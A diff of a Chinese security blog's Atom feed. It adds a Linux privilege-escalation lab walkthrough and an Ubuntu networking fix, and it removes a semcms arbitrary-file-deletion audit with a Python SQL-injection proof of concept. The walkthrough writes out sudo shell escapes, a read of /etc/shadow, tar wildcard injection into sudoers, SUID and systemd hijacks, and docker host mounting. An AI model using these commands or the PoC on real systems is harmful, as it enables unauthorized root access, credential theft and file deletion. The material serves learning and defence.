@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://zhengbao.wang/"/>
-  <updated>2019-08-16T08:30:47.360Z</updated>
+  <updated>2019-09-24T08:49:56.483Z</updated>
   <id>https://zhengbao.wang/</id>
   
   <author>
@@ -15,6 +15,57 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Linux提权姿势</title>
+    <link href="https://zhengbao.wang/Linux%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF/"/>
+    <id>https://zhengbao.wang/Linux提权姿势/</id>
+    <published>2019-09-24T08:48:27.000Z</published>
+    <updated>2019-09-24T08:49:56.483Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文是在阅读了<code>in.security 提权靶场通关手册</code>后学习的一点总结和记录，作为笔记供以后使用查阅。原文链接将附在文末。</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>获取到一个shell后，要进行一系列的信息收集，以获取更多的提权思路。</p><ul><li><p>检测当前用户权限</p><p><code>whoami</code>  <code>id</code></p><p><img src="https://i.loli.net/2019/09/23/Ju21c6HLqaCrER7.png" alt></p></li><li><p>查看系统的发行版本和内核版本</p><p><code>lsb_release -a</code>  <code>uname -a</code></p><p><img src="https://i.loli.net/2019/09/23/9pc5RzrtWehmGQ2.png" alt></p></li><li><p>查看suid文件</p></li></ul><p><img src="https://i.loli.net/2019/09/23/5eydfPx4hBpRacN.png" alt></p><ul><li>查看运行的服务及安装的程序</li><li>查看<code>/etc/passwd</code>文件及隐藏文件等</li></ul><p>收集到的信息越多，越能找到更多的突破口。</p><h2 id="0x02-提权方法"><a href="#0x02-提权方法" class="headerlink" title="0x02 提权方法"></a>0x02 提权方法</h2><h3 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo  提权"></a>sudo  提权</h3><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。普通用户可以通过<code>sudo -l</code>命令查看可以执行哪些命令。这样普通用户就可以在不知道root密码的情况下使用这些命令。因为用户使用<code>sudo</code>命令时需验证自己身份，因此这个方法需要知道普通用户的密码。</p><p><img src="https://i.loli.net/2019/09/23/ejFrkhbDVAzfXwE.png" alt></p><p>可以看到靶场<code>bob</code>用户可以使用<code>awk</code> <code>curl</code> <code>man</code> 等很多命令。</p><p>那么下面就这些命令展开利用，这里推荐一个在线查询工具：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p><p><code>sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code> 这里借助<code>awk</code>直接获取到root权限</p><p><img src="https://i.loli.net/2019/09/23/yikXDCVNZ892mrB.png" alt></p><p>接下来用<code>man</code>试一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/23/mAOjVwKYQPMn4tl.png" alt></p><p>利用<code>script</code></p><p><code>script -q /dev/null</code></p><p><img src="https://i.loli.net/2019/09/23/lWf3ycnVjSuOkKm.png" alt></p><p>利用<code>curl</code>读取root文件</p><p><code>curl file:///etc/shadow</code></p><p>其他的都可以通过上面的在线网站查找到利用方式，这里不一一例举了。</p><h3 id="cronjobs-提权"><a href="#cronjobs-提权" class="headerlink" title="cronjobs 提权"></a>cronjobs 提权</h3><p>如果系统管理员设置了计划任务并以root权限运行，比如周期性的运行某一个脚本，如果普通有权限修改这个脚本的话，便可以执行任意命令造成权限提升。</p><p>此外还有一个Crontab Tar通配符注入，当计划任务中以root权限进行tar命令操作时，可以造成通配符注入进行权限提升。下面在靶场中进行展示。</p><p>查看<code>/etc/crontab</code>，可以看到每分钟执行了<code>backup</code>脚本</p><p><img src="https://i.loli.net/2019/09/23/13DjNI6qBE2PyFb.png" alt></p><p>查看backup内容，进行了tar打包操作，</p><p><img src="https://i.loli.net/2019/09/23/ZCaqENBFmHAGyzr.png" alt></p><p>然后便可以进行提权操作了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers'</span> &gt;test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; <span class="string">"--checkpoint-action=exec=sh test.sh"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; --checkpoint=1</span><br></pre></td></tr></table></figure><p>等一分钟后，待计划任务完成，使用<code>sudo  bash</code>，便会提升至root权限。</p><p><img src="https://i.loli.net/2019/09/23/DpSmHZxsV51AUIG.png" alt></p><p>那么在第一步说到的信息收集中，查看<code>/etc/crontab</code>也应该被列为信息收集的一步，说不定就会有意想不到的收获。</p><p>所以在设定计划任务时要注意一些问题：</p><ul><li>crontab任务千万不要写到/etc/crontab文件里。通过crontab -e去创建，让他写到默认的/var/spool/cron下；</li><li>尽量避免使用root 去创建，如果一定要用root，要注意设置权限。</li></ul><h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>suid是指二进制文件在执行时拥有其拥有者owner的权限，例如<code>passwd</code>命令</p><p><img src="https://i.loli.net/2019/09/23/6wWuqF3zdls4ijG.png" alt></p><p>使用<code>find / -user root -perm -4000 2&gt;/dev/null</code> 或者<code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;</code>查找所有owner为root且为suid的二进制文件</p><p><img src="https://i.loli.net/2019/09/23/WKQaFylPcST3oNs.png" alt></p><p>查看其中一个<code>/usr/bin/taskset</code>,在前面提到的在线网站<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>查看命令</p><p><code>sudo taskset 1 /bin/sh</code>直接获取到root权限</p><p><img src="https://i.loli.net/2019/09/23/IjMiak5X6hRlxJA.png" alt></p><h3 id="NFS-未授权"><a href="#NFS-未授权" class="headerlink" title="NFS 未授权"></a>NFS 未授权</h3><p>nmap扫描一下<code>nmap -T4 -sS -Pn 192.168.111.122</code></p><p>发现了2049端口开启的nfs服务，nfs，英文全称Network File System，即网络文件系统，是由SUN公司研制的UNIX表示层协议，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。</p><p><img src="https://i.loli.net/2019/09/24/Jct4FXgTAv9bxG3.png" alt></p><p>这里使用两外一台机器对其进行访问。 </p><p>首先<code>showmount -e 192.168.111.122</code>查看可以访问的目录。</p><p><img src="https://i.loli.net/2019/09/24/Siw4pRZtyB9W28c.png" alt></p><p>将其挂载到本地进行查看</p><p><img src="https://i.loli.net/2019/09/24/XS5Z7jE6kvA4imN.png" alt></p><p>我们在挂载的<code>/mnt/peter</code>目录是没有写权限的，但是由于其所有者uid设定1001，所属组gid设定1005，所有只需要本地创建一个uid为1001，gid为1005的用户即可绕过其权限验证。</p><p><img src="https://i.loli.net/2019/09/24/ORBzYbu2tKAg7dn.png" alt></p><p>创建一个符合要求的用户后，即可执行写操作了。</p><p><img src="https://i.loli.net/2019/09/24/orpnVlsiH2JCeuN.png" alt></p><p>生成新创建用户boogle的ssh公钥对和私钥对。</p><p><img src="https://i.loli.net/2019/09/24/eqhYgBTGLuJZVaH.png" alt></p><p>因为现在又对peter家目录的写权限，所以现在可以直接将上面的公钥对写入到peter的<code>.ssh</code>目录下，这样便可以直接使用ssh登陆获取peter用户的shell。</p><p><img src="https://i.loli.net/2019/09/24/UNlsf8JdogWDOYh.png" alt></p><h3 id="docker-组用户提权"><a href="#docker-组用户提权" class="headerlink" title="docker 组用户提权"></a>docker 组用户提权</h3><p>查看上面peter发现其属于<code>docker</code>组用户</p><p><img src="https://i.loli.net/2019/09/24/7b4pQBkcJw2EWxr.png" alt></p><p>docker组用户的权限还是非常大的，相当于root权限了。可以借助其提权到root权限。</p><p>思路参考：<a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">普通用户借助Docker容器提权思路分享</a>。</p><p>还有一个具体的利用代码：<a href="https://github.com/chrisfosterelli/dockerrootplease" target="_blank" rel="noopener">https://github.com/chrisfosterelli/dockerrootplease</a></p><p><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></p><h3 id="systemd-配置提权"><a href="#systemd-配置提权" class="headerlink" title="systemd 配置提权"></a>systemd 配置提权</h3><p>查看<code></code>文件，并且peter用户有对其读写的权限。</p><p><img src="https://i.loli.net/2019/09/24/RYWZGhbSQkTmBzL.png" alt></p><p>修改其配置ExecStart指向我们自定义的二进制文件，其启动时便会以root用户执行这个文件。</p><p><img src="https://i.loli.net/2019/09/24/VEmf9MutGBon7aL.png" alt></p><p>创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限</p><p><code>echo -e &#39;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash&#39; &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</code></p><p><img src="https://i.loli.net/2019/09/24/sAR4UaNp6L9DbJo.png" alt></p><p>重启之前便会生成systemdbash文件</p><p><img src="https://i.loli.net/2019/09/24/MhyCcbHdWVPRZ5l.png" alt></p><p>复制前面的ssh公钥到root用户下</p><p><img src="https://i.loli.net/2019/09/24/1vYNf3jI6l2cFnV.png" alt></p><p>然后便可以直接ssh登陆到root</p><p><img src="https://i.loli.net/2019/09/24/SwOntaiyFLhDGcW.png" alt></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489960&amp;idx=1&amp;sn=ae35c8e5eb5e08e713cfd204b71a6b9d&amp;chksm=fc1e8e7ecb6907685255c77713c7a99b4acdc223db736f1610202b84ac8467335b6b076286b9&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1568377810435&amp;sharer_shareid=1a40c63f9740ea43a4986b88206018cd#rd" target="_blank" rel="noopener">in.security 提权靶场通关手册上篇</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247490025&amp;idx=1&amp;sn=f6ba22761d89c1154c4bc9bd22e16df0&amp;chksm=fc1e8e3fcb690729907504393dd6c788c05c9cd9866e3df62786bbc318ab7524ea5c716e7501&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1568338917816&amp;sharer_shareid=1a40c63f9740ea43a4986b88206018cd#rd" target="_blank" rel="noopener">in.security 提权靶场通关手册下篇</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;本文是在阅读了&lt;code&gt;in.security 提权靶场通关手册&lt;/code&gt;后学习的一点总结和记
+      
+    
+    </summary>
+    
+      <category term="后渗透" scheme="https://zhengbao.wang/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="提权" scheme="https://zhengbao.wang/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ubuntu网络问题记录</title>
+    <link href="https://zhengbao.wang/ubuntu%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
+    <id>https://zhengbao.wang/ubuntu网络问题记录/</id>
+    <published>2019-09-21T09:05:00.000Z</published>
+    <updated>2019-09-24T09:06:55.244Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>又遇到了ubuntu18.04的网络问题，这里记录一下，他日备用。</p><h2 id="0x01-问题排查"><a href="#0x01-问题排查" class="headerlink" title="0x01 问题排查"></a>0x01 问题排查</h2><h3 id="检查物理机服务"><a href="#检查物理机服务" class="headerlink" title="检查物理机服务"></a>检查物理机服务</h3><p>如果是虚拟机，首先在物理机中查看服务，查看下面内容是否已经启动，没有则启动。</p><p><img src="https://i.loli.net/2019/09/12/UFsVyiwIOD18bdu.png" alt></p><h3 id="检查interfaces配置"><a href="#检查interfaces配置" class="headerlink" title="检查interfaces配置"></a>检查interfaces配置</h3><p>虚拟机配置为NAT模式，小图标显示网卡启动成功，但是使用<code>ifconfig</code>却看不到网卡信息。</p><p><img src="https://i.loli.net/2019/09/12/a6CU8iHybXqOrMd.png" alt></p><p>执行命令<code>if a</code>，这里<code>ens33</code>网卡在<code>ifconfig</code>中并没有显示出来。（下图是配置好后截图）</p><p><img src="https://i.loli.net/2019/09/12/d4azA6UKw2OI9rq.png" alt></p><p>然后编辑interfaces文件    <code>sudo vi /etc/network/interfaces</code></p><p>这里并没有<code>ens33</code>配置信息，添加一下。</p><p><img src="https://i.loli.net/2019/09/12/ircL7zwNVC1v6OU.png" alt></p><p>添加内容</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto ens33</span><br><span class="line">iface<span class="built_in"> INTERFACE </span>inet dhcp</span><br></pre></td></tr></table></figure><p>保存配置后重启网络<code>/etc/init.d/networking restart</code></p><p>网络通畅。</p><h3 id="检查netplan配置"><a href="#检查netplan配置" class="headerlink" title="检查netplan配置"></a>检查netplan配置</h3><p>ubuntu18.04 LTS后使用<code>netplan</code>配置网络，此时当查看<code>interfaces</code>文件时会发现下面的提示。</p><p><img src="https://i.loli.net/2019/09/24/kbe3tVQKPpzEgqh.png" alt></p><p>这时要修改<code>/etc/netplan/50-cloud-init.yaml</code>文件</p><p><img src="https://i.loli.net/2019/09/24/FVdrESneNZzcBwY.png" alt></p><p><code>sudo netplan apply</code>使配置生效。</p><h3 id="防火墙问题"><a href="#防火墙问题" class="headerlink" title="防火墙问题"></a>防火墙问题</h3><p>此外还可能存在防火墙配置问题，比如<code>ufw</code> </p><p><code>sudo ufw disable</code></p><h2 id="0x02-其他问题"><a href="#0x02-其他问题" class="headerlink" title="0x02 其他问题"></a>0x02 其他问题</h2><p>如果后期遇到其他问题，将继续作补充。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;又遇到了ubuntu18.04的网络问题，这里记录一下，他日备用。&lt;/p&gt;
+&lt;h2 id=&quot;0x01
+      
+    
+    </summary>
+    
+      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
+    
+    
+      <category term="linux" scheme="https://zhengbao.wang/tags/linux/"/>
+    
+  </entry>
   
   <entry>
     <title>jsonp劫持漏洞</title>
@@ -472,59 +523,6 @@
       
       
         &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此次审计为Ljphpcms_v1.03最新版&lt;br&gt;demo:&lt;a href=&quot;http://dem
-      
-    
-    </summary>
-    
-      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>burpsuite安装分块传输插件</title>
-    <link href="https://zhengbao.wang/burpsuite%E5%AE%89%E8%A3%85%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E6%8F%92%E4%BB%B6/"/>
-    <id>https://zhengbao.wang/burpsuite安装分块传输插件/</id>
-    <published>2019-03-18T02:14:07.000Z</published>
-    <updated>2019-03-18T02:22:10.065Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a></p><h2 id="0x02-mvn-package"><a href="#0x02-mvn-package" class="headerlink" title="0x02 mvn package"></a>0x02 mvn package</h2><h3 id="命令打包"><a href="#命令打包" class="headerlink" title="命令打包"></a>命令打包</h3><p>下载完成后可直接在<code>pom.xml</code>根目录执行<code>mvn package</code>进行打包，成功后生成一个<code>target</code>文件夹，里面有打包好的burpsuite插件。</p><h3 id="IDE打包"><a href="#IDE打包" class="headerlink" title="IDE打包"></a>IDE打包</h3><p>我这里就用的<code>myeclipse</code>。这里简述一下步骤<br>首先通过<code>file-&gt;import</code>导入目标，选择<code>Existing Maven Projects</code><br><img src="https://i.loli.net/2019/03/18/5c8ef5589fe5a.png" alt><br>执行下一步，选择下载好的包含<code>pom.xml</code>的上级目录即可<br><img src="https://i.loli.net/2019/03/18/5c8ef614e87b5.png" alt><br>然后稍等一会即可在<code>Packahe Explorer</code>视图中看到整个项目<br><img src="https://i.loli.net/2019/03/18/5c8ef65fbfb83.png" alt><br>然后在<code>pom.xml</code>上右键执行<code>run as-&gt;maven package</code>操作。<br>如果没有<code>maven package</code>操作可以选择<code>maven build</code>，新建一个，填写Goals为package<br><img src="https://i.loli.net/2019/03/18/5c8ef75b39b21.png" alt><br>然后等待其打包完成即可，完成后在target目录中机会生成目标<code>.jar</code>文件<br><img src="https://i.loli.net/2019/03/18/5c8ef83018b3c.png" alt></p><p>然后启动burpsuite，执行插件添加操作，选择刚才打包好的jar文件<br><img src="https://i.loli.net/2019/03/18/5c8ef868ba29d.png" alt></p><p>安装成功会有提示<br><img src="https://i.loli.net/2019/03/18/5c8ef8c54ec3f.png" alt><br>然后就可以享受这一利器带来的便利了<br><img src="https://i.loli.net/2019/03/18/5c8ef9079e7cc.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：&lt;a href=&quot;https:
-      
-    
-    </summary>
-    
-      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="burpsuite" scheme="https://zhengbao.wang/tags/burpsuite/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>semcms_php_v3.8任意文件刪除</title>
-    <link href="https://zhengbao.wang/semcms-php-v3-8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%AA%E9%99%A4/"/>
-    <id>https://zhengbao.wang/semcms-php-v3-8任意文件刪除/</id>
-    <published>2019-03-16T08:24:25.000Z</published>
-    <updated>2019-03-25T00:35:07.786Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此篇为审计semcms_php_v3.8的第五篇文章</p><p>SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。<br>SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。<br>官网: <a href="http://www.sem-cms.com" target="_blank" rel="noopener">http://www.sem-cms.com/</a><br>审计版本为最新php版 v3.8<br><img src="https://i.loli.net/2019/03/14/5c89d09c2c001.png" alt></p><h2 id="0x01-任意文件删除"><a href="#0x01-任意文件删除" class="headerlink" title="0x01 任意文件删除"></a>0x01 任意文件删除</h2><p>首先在后台<code>Include/function.php</code>功能函数文件中，有一个执行文件删除的函数<code>Delfile()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//删除指定文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Delfile</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">    unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line">   $filename=str_replace(<span class="string">"prdoucts/"</span>, <span class="string">"prdoucts/small/"</span>, $filename);</span><br><span class="line">  <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">    unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>全局搜索查看在哪里调用了该函数。发现在<code>SEMCMS_Function.php</code>中有多次调用<br><img src="https://i.loli.net/2019/03/16/5c8cbc75c111b.png" alt><br>这里随便跟踪一个，进入到<code>SEMCMS_Function.php</code>第921行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="variable">$db_conn</span>-&gt;query(<span class="string">"select * from sc_images WHERE ID in (<span class="variable">$area_arr</span>)"</span>);</span><br><span class="line">                    <span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$query</span>))&#123;</span><br><span class="line">                         Delfile(<span class="variable">$row</span>[<span class="string">'images_url'</span>]);</span><br><span class="line">                       &#125;</span><br></pre></td></tr></table></figure></p><p>可以发现应该是一个图片删除操作，图片目录保存在数据表<code>sc_images</code>中。到数据库中查看可以验证这一点<br><img src="https://i.loli.net/2019/03/16/5c8cbd2c1d826.png" alt></p><p>那么此时便可以看看<code>$area_arr</code>变量是否可控，从而改变sql查询的结果，达到任意文件删除。继续向上跟踪<code>area_arr</code>变量。<br><img src="https://i.loli.net/2019/03/16/5c8cbdf0f1584.png" alt><br>在该文件开头可以看到定义了<code>area_arr</code>数组，并且是由<code>POST</code>方式传递进来的<code>AID</code>得到的。<br>这里小伙伴们又要开始惊喜了，因为前面的分析分章不只出现这一处问题了,我们知道后台所有页面均包含了<code>contorl.php</code>对<code>GET</code>传来的数据进行了清洗。而这里偏偏却用了POST方式来接收数据，继续跟踪改变量后，发现到拼接进sql语句再到进入文件删除函数过程中未进行其他任何过滤。</p><p><code>SEMCMS_Function.php 919行</code><br><img src="https://i.loli.net/2019/03/16/5c8cb6d02d441.png" alt><br>后台<code>Include/function.php</code><br><img src="https://i.loli.net/2019/03/16/5c8cb72c99346.png" alt></p><p>如上图显示，网站根目录下<code>boogle.php</code>已被成功删除。</p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="comment">#[+]Author : boogle</span></span><br><span class="line"><span class="comment">#[+]Blog :https://boogle.github.io/</span></span><br><span class="line"></span><br><span class="line">delete_file = <span class="string">"'../test.php'"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"-1) union select 1,"</span>+delete_file+<span class="string">",3,4,5-- -"</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"http://127.0.0.1:80/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php?Class=Deleted&amp;CF=Images"</span></span><br><span class="line"></span><br><span class="line">burp0_headers = &#123;<span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>, <span class="string">"Origin"</span>: <span class="string">"http://127.0.0.1"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>, <span class="string">"Referer"</span>: <span class="string">"http://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">burp0_data=&#123;<span class="string">"AID[]"</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers,  data=burp0_data)</span><br><span class="line"></span><br><span class="line">print <span class="string">"[+]delete Success!"</span></span><br></pre></td></tr></table></figure><h2 id="0x03-修复方法"><a href="#0x03-修复方法" class="headerlink" title="0x03 修复方法"></a>0x03 修复方法</h2><p>在<code>contorl.php</code>中增加对POST的过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST))&#123;$PostArray=$_POST;&#125;<span class="keyword">else</span>&#123;$PostArray=<span class="string">''</span>;&#125; <span class="comment">//post</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> ($PostArray <span class="keyword">as</span> $value)&#123; <span class="comment">//post</span></span><br><span class="line">    </span><br><span class="line">    verify_str($value);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此篇为审计semcms_php_v3.8的第五篇文章&lt;/p&gt;
-&lt;p&gt;SemCms是一套开源外贸企业网
       
     
     </summary>
